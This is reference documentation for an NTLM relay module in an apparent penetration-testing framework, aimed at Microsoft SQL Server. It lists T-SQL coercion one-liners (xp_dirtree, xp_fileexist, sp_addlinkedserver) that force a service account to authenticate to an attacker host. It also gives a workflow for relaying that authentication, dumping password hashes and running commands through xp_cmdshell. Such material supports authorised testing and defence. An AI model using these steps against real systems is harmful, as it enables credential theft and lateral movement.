# RelayMSSQL Server

The **RelayMSSQL** server is the NTLM relay variant aimed at **Microsoft SQL Server**
back-ends. Inbound NTLM authentications are forwarded into a fresh `MSSQLConnection`
against one of the configured `targets`, and on success the connection is wrapped into a
real interactive **MSSQL client session** in the project — already authenticated, ready
to issue queries, abuse `xp_cmdshell`, dump password hashes from `sys.sql_logins`, jump
across linked servers, and so on.

| Inbound listener (front)                     | Outbound target (back)             |
| -------------------------------------------- | ---------------------------------- |
| `smb`, `http`, `https`, `httpproxy`, `mssql` | MSSQL TDS on `targets:targetport`  |

The listener side is **shared** with the rest of the relay family — see the
**"Listener-side parameters (shared)"** section in [`RELAYSMB`](relaysmb.md#listener-side-parameters-shared)
for the full reference. This page documents only the MSSQL-specific parameters and
behaviour.

---

## How it works

1. Bring up one or more listeners on the agent host.
2. A SQL Server service account authenticates to one of those listeners — typically
   because it was *coerced* via T-SQL functions that touch a UNC path
   (`xp_dirtree`, `xp_fileexist`, `BULK INSERT FROM '\\agent\share\file'`, `bcp out`
   to a UNC, etc.). The SQL Server service account itself authenticates outbound to
   the agent.
3. The captured NTLM exchange is shuttled into a fresh outbound TDS connection against
   the next entry in `targets:targetport`. Targets are walked round-robin.
4. The relay is *verified* by issuing `SELECT @@version` over the relayed session — if
   that returns, the relay is considered successful.
5. The captured Net-NTLM hash is added to the project's **Credentials Hub** with
   `source = RELAYED`.
6. A new **interactive MSSQL client session** is created with `description = RELAYED`
   and bound to the relayed connection via `setup_relay()`. From here every command in
   the [MSSQL client](../clients/mssql.md) — `query`, `xpcmdshell`, `dumphashes`,
   `enumlinks`, `uselink`, the SQL Browser GUI, etc. — runs against the relayed
   instance.

!!! info "MSSQL relays don't usually require signing checks"
    SMB-signing and LDAP-signing are the typical relay-killers; MSSQL has no equivalent
    *signing* requirement at the TDS layer (TDS encryption / TLS is a separate concern
    and is supported transparently). What you need instead is a SQL Server that is
    willing to accept *integrated authentication* (NTLM / SPNEGO over TDS), which is
    every default MSSQL install on a domain-joined host.

---

## Coercion paths from SQL Server

The most useful pattern for `RELAYMSSQL` is **chaining** — start with a low-privilege
foothold on one SQL instance and use it to coerce the *service account* of another
instance (or even the same one) to authenticate to the agent. Common T-SQL coercion
primitives, all available from the [MSSQL client](../clients/mssql.md):

| Primitive                                          | Notes                                                            |
| -------------------------------------------------- | ---------------------------------------------------------------- |
| `EXEC xp_dirtree '\\agent\share', 1, 1`            | Most reliable; usually allowed for any login.                    |
| `EXEC xp_fileexist '\\agent\share\file'`           | Same effect, slightly different code path.                       |
| `EXEC xp_subdirs '\\agent\share'`                  | Same family.                                                     |
| `BULK INSERT t FROM '\\agent\share\file' WITH (...)` | Requires `ADMINISTER BULK OPERATIONS`; rarely available.       |
| `EXEC sp_addlinkedserver '\\agent\share'`          | Triggers a TDS-level outbound auth toward the linked target.     |

The MSSQL client exposes a `coerce` command that wraps these — see
[MSSQL client → coerce](../clients/mssql.md#coerce). Combined with `RELAYMSSQL` on
the agent side, you can pivot from `db_owner` on instance A to *service-account
authenticated* on instance B in a single hop.

For non-SQL coercion (PrinterBug, MS-EFSRPC, WebDAV, …) the inbound path lands on the
SMB / HTTP listener exactly the same as for `RELAYSMB`; the only difference here is
that the back-end is a SQL Server.

---

## Operational requirements

The same requirements as the rest of the relay family apply — see
[`RELAYSMB` Operational requirements](relaysmb.md#operational-requirements). Two
MSSQL-specific notes:

- **The MSSQL listener** (`servertypes=...,mssql` on port `1433`) is only useful when
  you expect a SQL Server to connect *outbound* over TDS to the agent — typically via
  `sp_addlinkedserver` coercion or a misconfigured linked-server pointing at the agent
  IP. The default `servertypes` does **not** include `mssql`; add it explicitly when
  needed.
- **The agent must reach `1433/TCP`** (or `targetport`) on the SQL Server hosts in
  `targets`. If the agent is behind a wsnet proxy, set `connectproxy` so the outbound
  TDS connection routes through it as well.

---

## Relay-specific parameters

These are the parameters unique to **`RELAYMSSQL`**. See
[`RELAYSMB`](relaysmb.md#listener-side-parameters-shared) for the listener-side parameters
shared by every relay variant.

### Normal parameters

#### `targets`
Comma-separated list of MSSQL targets (hostnames or IP addresses). **Required.** Walked
round-robin: each new captured authentication is sent to the next entry.

### Advanced parameters

#### `targetport`
Default: `1433`. The TCP port `targets` listen on for TDS. Override this for non-default
or named-instance ports. The same value is used to populate the spawned interactive
client's `port` parameter so subsequent commands in that session connect to the right
endpoint.

#### `connectproxy`
Proxy ID for the **outbound** TDS connection. Independent from `serverproxy`. On WASM
this is auto-set to `0` if unset.

---

## Commands

The standard `ScannerConsoleBase` commands apply (`setparam`, `getparam`, `params`,
`info`, `serve`, `stop`, `historylist`, …):

#### `serve`
Bring up the configured listeners and the relay-handler task. Each captured authentication
is shuttled into `handle_mssql_relay`, which opens an outbound TDS connection per target
and (on success) spawns a fresh interactive MSSQL client session.

#### `stop`
Stop all listener tasks and the relay-handler task. Interactive MSSQL sessions spawned
by previous successful relays are **not** closed.

---

## Typical workflow

1. **Identify accessible SQL Server hosts.** Run [`mssqlfinger`](../scanners/mssqlfinger.md)
   over your target range to find live instances and their TCP ports.
2. **Start `RELAYMSSQL`** with `targets=<list of SQL Server hosts>` and (if needed)
   `targetport=<port>`. Leave the default `servertypes` for SMB-bound coercion paths;
   add `mssql` if you plan to use linked-server coercion.
3. **Drive a SQL coercion** from a separate session. From an existing MSSQL client
   (even a low-privilege one), call `coerce` with the agent's IP as the listener.
   The SQL Server service account will authenticate outbound to the agent.
4. **Watch the relay console.** A successful relay prints `MSSQL relay worked!` and a
   new session ID. Switch to that session — you have an authenticated MSSQL client on
   the relayed instance, running as the *service account*.
5. **Pivot inside SQL Server.** From the relayed session, dump password hashes
   ([`dumphashes`](../clients/mssql.md#dumphashes)), enumerate linked servers
   ([`enumlinks`](../clients/mssql.md#enum)), execute commands via
   [`xpcmdshell`](../clients/mssql.md#xpcmdshell), etc. See
   [MSSQL client](../clients/mssql.md) for the full command set.

---

## Limitations & gotchas

- **TDS encryption / TLS is handled transparently** by the underlying `atds` library;
  there is no equivalent of the SMB-signing kill-switch here. If a relay fails it is
  almost always at the *authentication* stage, not the transport stage.
- **`SELECT @@version` is the liveness check.** A target that accepts the relayed
  authentication but refuses the query (e.g. an extreme `DENY EXECUTE` lockdown) will
  be reported as a failed relay. Look for the verification log line in the server
  console with `debug=True`.
- **`RELAYMSSQL` does not auto-loot.** Unlike `RELAYSMB`, no automatic post-relay
  actions run. If you want to dump password hashes immediately on successful relay,
  do it from the spawned session.
- **Service-account context, not interactive user.** Authentications coerced from a
  SQL Server are by the *service account* (`NT Service\MSSQLSERVER`,
  `<DOMAIN>\<host>$`, or a configured domain account), not by the SQL login that
  triggered the coercion. Plan downstream attacks against that account, not the
  triggering user.
- **NTLM-only coercion.** SQL coercion produces NTLM authentication outbound; this is
  what the relay needs. Kerberos service-account coercion (when the SQL Server has a
  registered SPN and the coercion path is a hostname) does not relay.
- **The MSSQL listener is off by default** in `servertypes`. Add `mssql` explicitly
  when you intend to catch outbound TDS auth.
